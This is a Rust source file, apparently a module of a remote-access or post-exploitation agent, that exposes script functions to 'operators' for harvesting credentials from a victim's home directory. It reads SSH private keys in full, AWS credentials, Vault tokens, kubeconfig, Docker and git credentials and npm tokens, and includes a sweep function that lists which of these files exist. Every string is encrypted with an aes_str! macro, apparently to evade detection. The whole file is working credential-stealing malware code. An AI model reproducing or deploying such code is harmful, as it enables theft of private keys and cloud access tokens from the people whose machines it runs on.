// src/agent/scripting/credential.rs
//
// Convenience readers for well-known credential file locations.
// Each function wraps what could be done with internal_read + internal_find_files
// but handles path resolution, profile discovery, and format normalization
// so operator scripts don't have to re-implement the logic.

use rhai::Engine;
use std::{fs, path::PathBuf};
use serde_json::json;
use crate::strcrypt_rt;
use strcrypt::aes_str;

pub fn register(engine: &mut Engine) {

    // ── SSH private keys ──────────────────────────────────────────────────────
    // Scans ~/.ssh/ (or a provided directory) for private key files.
    // Returns JSON: [{path, content, key_type}]
    engine.register_fn(&aes_str!("internal_ssh_keys"), |home_dir: &str| -> String {
        let base = if home_dir.is_empty() {
            home_path(&aes_str!(".ssh"))
        } else {
            PathBuf::from(home_dir)
        };
        let Ok(rd) = fs::read_dir(&base) else {
            return format!("{}{}", aes_str!("Error: cannot read "), base.display());
        };
        let keys: Vec<serde_json::Value> = rd.flatten()
            .filter(|e| e.file_type().map(|t| t.is_file()).unwrap_or(false))
            .filter_map(|e| {
                let content = fs::read_to_string(e.path()).ok()?;
                if !content.contains(&aes_str!("PRIVATE KEY")) { return None; }
                let key_type = if content.contains(&aes_str!("RSA PRIVATE"))    { aes_str!("rsa") }
                    else if content.contains(&aes_str!("OPENSSH PRIVATE"))      { aes_str!("openssh") }
                    else if content.contains(&aes_str!("EC PRIVATE"))           { aes_str!("ecdsa") }
                    else if content.contains(&aes_str!("DSA PRIVATE"))          { aes_str!("dsa") }
                    else                                                        { aes_str!("unknown") };
                Some(json!({
                    aes_str!("path").as_str():     e.path().display().to_string(),
                    aes_str!("key_type").as_str(): key_type,
                    aes_str!("content").as_str():  content,
                }))
            })
            .collect();
        serde_json::to_string(&keys).unwrap_or("[]".into())
    });

    // ── AWS credentials ───────────────────────────────────────────────────────
    // Reads ~/.aws/credentials and ~/.aws/config.
    // Returns JSON: {credentials, config}
    engine.register_fn(&aes_str!("internal_aws_credentials"), || -> String {
        let creds  = read_home(&aes_str!(".aws/credentials"));
        let config = read_home(&aes_str!(".aws/config"));
        json!({ aes_str!("credentials").as_str(): creds, aes_str!("config").as_str(): config }).to_string()
    });

    // ── HashiCorp Vault token ─────────────────────────────────────────────────
    engine.register_fn(&aes_str!("internal_vault_token"), || -> String {
        read_home(&aes_str!(".vault-token"))
    });

    // ── Kubernetes config ─────────────────────────────────────────────────────
    // Contains cluster endpoints, CA bundles, and user credentials.
    engine.register_fn(&aes_str!("internal_kube_config"), || -> String {
        // Honour KUBECONFIG env var first.
        if let Ok(path) = std::env::var(aes_str!("KUBECONFIG")) {
            if let Ok(content) = fs::read_to_string(&path) {
                return content;
            }
        }
        read_home(&aes_str!(".kube/config"))
    });

    // ── Docker credentials ────────────────────────────────────────────────────
    // Contains base64-encoded registry auth tokens.
    engine.register_fn(&aes_str!("internal_docker_config"), || -> String {
        read_home(&aes_str!(".docker/config.json"))
    });

    // ── Git credentials ───────────────────────────────────────────────────────
    // ~/.git-credentials stores plaintext https://user:token@host entries.
    engine.register_fn(&aes_str!("internal_git_credentials"), || -> String {
        read_home(&aes_str!(".git-credentials"))
    });

    // ── npm / node auth tokens ────────────────────────────────────────────────
    // ~/.npmrc may contain //registry.npmjs.org/:_authToken=...
    engine.register_fn(&aes_str!("internal_npm_token"), || -> String {
        read_home(&aes_str!(".npmrc"))
    });

    // ── Generic credential sweep ──────────────────────────────────────────────
    // Checks all of the above paths and returns a JSON summary of what exists.
    engine.register_fn(&aes_str!("internal_credential_sweep"), || -> String {
        let checks: Vec<(String, String)> = vec![
            (aes_str!("ssh_keys"),     aes_str!(".ssh")),
            (aes_str!("aws_creds"),    aes_str!(".aws/credentials")),
            (aes_str!("vault_token"),  aes_str!(".vault-token")),
            (aes_str!("kube_config"),  aes_str!(".kube/config")),
            (aes_str!("docker_cfg"),   aes_str!(".docker/config.json")),
            (aes_str!("git_creds"),    aes_str!(".git-credentials")),
            (aes_str!("npmrc"),        aes_str!(".npmrc")),
        ];
        let results: Vec<serde_json::Value> = checks.iter()
            .map(|(name, rel)| {
                let path = home_path(rel);
                json!({
                    aes_str!("name").as_str():   name,
                    aes_str!("path").as_str():   path.display().to_string(),
                    aes_str!("exists").as_str(): path.exists(),
                    aes_str!("size").as_str():   fs::metadata(&path).map(|m| m.len()).unwrap_or(0),
                })
            })
            .collect();
        serde_json::to_string(&results).unwrap_or("[]".into())
    });
}

// ─────────────────────────────────────────────────────────────────────────────
// Helpers
// ─────────────────────────────────────────────────────────────────────────────

fn home_path(rel: &str) -> PathBuf {
    #[cfg(target_os = "windows")]
    let home = std::env::var(aes_str!("USERPROFILE")).unwrap_or_default();
    #[cfg(not(target_os = "windows"))]
    let home = std::env::var(aes_str!("HOME")).unwrap_or_default();

    PathBuf::from(home).join(rel)
}

fn read_home(rel: &str) -> String {
    fs::read_to_string(home_path(rel))
        .unwrap_or_else(|e| format!("{}{}", aes_str!("Error: "), e))
}